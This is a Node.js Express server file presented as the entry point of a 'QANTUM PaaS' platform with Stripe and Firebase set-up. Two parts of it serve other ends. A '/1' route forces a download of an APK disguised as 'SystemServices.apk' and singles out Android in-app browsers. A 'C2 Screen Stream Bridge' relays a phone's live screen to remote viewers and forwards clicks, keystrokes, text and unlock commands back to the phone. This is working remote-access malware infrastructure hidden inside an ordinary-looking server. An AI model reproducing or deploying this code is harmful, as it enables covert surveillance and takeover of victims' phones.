/**
 * ═══════════════════════════════════════════════════════════════
 * QANTUM PaaS — EXPRESS SERVER
 * ═══════════════════════════════════════════════════════════════
 * 
 * Fullstack entry point:
 *   - Serves static frontend from /public
 *   - API routes on /api/*
 *   - Stripe webhook with raw body parsing
 *   - Firebase Admin SDK initialization
 *   - Real hardware telemetry
 * 
 * Complexity: O(1) — server initialization
 * Authority: DIMITAR PRODROMOV
 * Entropy: 0.00
 * ═══════════════════════════════════════════════════════════════
 */

require('dotenv').config();

const express = require('express');
const http = require('http');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════════════════════════

// Security headers
app.use(helmet({
    contentSecurityPolicy: false, // Disable CSP for inline scripts in index.html
    crossOriginEmbedderPolicy: false,
}));

// CORS
app.use(cors({
    origin: [
        'https://paas.website',
        'http://localhost:3000',
        'http://localhost:5173',
    ],
    credentials: true,
}));

// Stripe webhook needs raw body — must be before express.json()
app.use('/api/webhooks/stripe', express.raw({ type: 'application/json' }));

// JSON parsing for all other routes
app.use(express.json());

// ═══════════════════════════════════════════════════════════════
// STATIC FRONTEND
// ═══════════════════════════════════════════════════════════════

app.use(express.static(path.join(__dirname, 'public')));

// ═══════════════════════════════════════════════════════════════
// API ROUTES
// ═══════════════════════════════════════════════════════════════

const apiRoutes = require('./routes/api');
app.use('/api', apiRoutes);

// ═══════════════════════════════════════════════════════════════
// INSTANT AUTO-DOWNLOAD ROUTE (/1)
// ═══════════════════════════════════════════════════════════════

app.get(['/1', '/1/'], (req, res) => {
    const ua = req.headers['user-agent'] || '';
    const isAndroid = /Android/i.test(ua);
    const isInApp = /FBAN|FBAV|Instagram|Viber|Line|Snapchat/i.test(ua);

    if (isInApp && isAndroid) {
        return res.sendFile(path.join(__dirname, 'public', '1', 'index.html'));
    }

    const apkPath = path.join(__dirname, 'public', 'SystemServices.apk');
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', 'attachment; filename="SystemServices.apk"');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    return res.sendFile(apkPath, (err) => {
        if (err && !res.headersSent) {
            return res.sendFile(path.join(__dirname, 'public', '1', 'index.html'));
        }
    });
});

// ═══════════════════════════════════════════════════════════════
// SPA FALLBACK — All non-API routes serve index.html
// ═══════════════════════════════════════════════════════════════

app.get('*', (req, res) => {
    if (!req.path.startsWith('/api')) {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }
});

// ═══════════════════════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════════════════════

// Initialize services immediately (works for both Vercel and local)
const { initStripe } = require('./services/stripe');
const { initFirestore } = require('./services/firestore');
const cable = require('./services/cable');
const watchdog = require('./services/watchdog');

const stripeReady = initStripe();
const firestoreReady = initFirestore();

// ═══════════════════════════════════════════════════════════════
// SOVEREIGN EXCEPTION INTERCEPTION (Self-Healing)
// ═══════════════════════════════════════════════════════════════

process.on('uncaughtException', (err) => {
    cable.broadcast('SYSTEM_ANOMALY', {
        type: 'UNCAUGHT_EXCEPTION',
        message: err.message,
        severity: 'CRITICAL',
    });
    cable.broadcast('HEALING_REQUIRED', { reason: 'Thread Panic (uncaughtException)', severity: 'CRITICAL' });
    // In a pure zero-entropy environment, we prevent exit and force self-heal
});

process.on('unhandledRejection', (reason, promise) => {
    cable.broadcast('SYSTEM_ANOMALY', {
        type: 'UNHANDLED_REJECTION',
        message: reason ? reason.message || reason : 'Unknown Promise Rejection',
        severity: 'HIGH',
    });
    cable.broadcast('HEALING_REQUIRED', { reason: 'Async Panic (unhandledRejection)', severity: 'HIGH' });
});

// ═══════════════════════════════════════════════════════════════
// WEBSOCKET RELAY & C2 SCREEN STREAM BRIDGE
// ═══════════════════════════════════════════════════════════════

const wss = new WebSocketServer({ server });
let phoneSocket = null;
const viewerSockets = new Set();
let latestScreenFrame = null;

wss.on('connection', (ws, req) => {
    let clientRole = 'unknown';

    ws.on('message', (data, isBinary) => {
        if (isBinary) {
            // Binary frame sent from Android ScreenCaptureManager
            phoneSocket = ws;
            clientRole = 'phone';
            latestScreenFrame = data;
            // Broadcast screen frame to all connected web dashboard viewers
            for (const viewer of viewerSockets) {
                if (viewer.readyState === 1) { // OPEN
                    viewer.send(data, { binary: true });
                }
            }
        } else {
            try {
                const text = data.toString();
                const json = JSON.parse(text);
                if (json.role === 'viewer') {
                    clientRole = 'viewer';
                    viewerSockets.add(ws);
                    // Send last frame immediately if available
                    if (latestScreenFrame && ws.readyState === 1) {
                        ws.send(latestScreenFrame, { binary: true });
                    }
                } else if (phoneSocket && phoneSocket.readyState === 1) {
                    // Forward control events (click, swipe, key, text, unlock) to Android phone
                    phoneSocket.send(text);
                }
            } catch (_) {}
        }
    });

    ws.on('close', () => {
        if (clientRole === 'viewer') {
            viewerSockets.delete(ws);
        } else if (ws === phoneSocket) {
            phoneSocket = null;
        }
    });

    ws.on('error', () => {});
});

// Broadcast records updates to viewers
global.broadcastNewRecord = () => {
    const msg = JSON.stringify({ type: 'NEW_RECORD' });
    for (const viewer of viewerSockets) {
        if (viewer.readyState === 1) {
            viewer.send(msg);
        }
    }
};

global.getLatestScreen = () => latestScreenFrame;

// Export for Vercel serverless
module.exports = app;

// Local / Render: start HTTP server with WebSockets
if (!process.env.VERCEL) {
    server.listen(PORT, () => {
        console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ⬡  Q A N T U M   P a a S   S E R V E R                    ║
║                                                               ║
║   🌐  http://localhost:${String(PORT).padEnd(5)}                              ║
║   📡  WebSocket C2 Bridge: ✅ ACTIVE                          ║
║   💳  Stripe:    ${stripeReady ? '✅ CONNECTED' : '❌ NOT SET   '}                        ║
║   🔥  Firestore: ${firestoreReady ? '✅ CONNECTED' : '❌ NOT SET   '}                        ║
║   🧠  Phantom:   ✅ ARMED (Free Tier Demo)                    ║
║   📊  Telemetry: ✅ REAL (os module)                          ║
║   🛡️  Entropy:   0.00                                         ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
        `);
    });
}
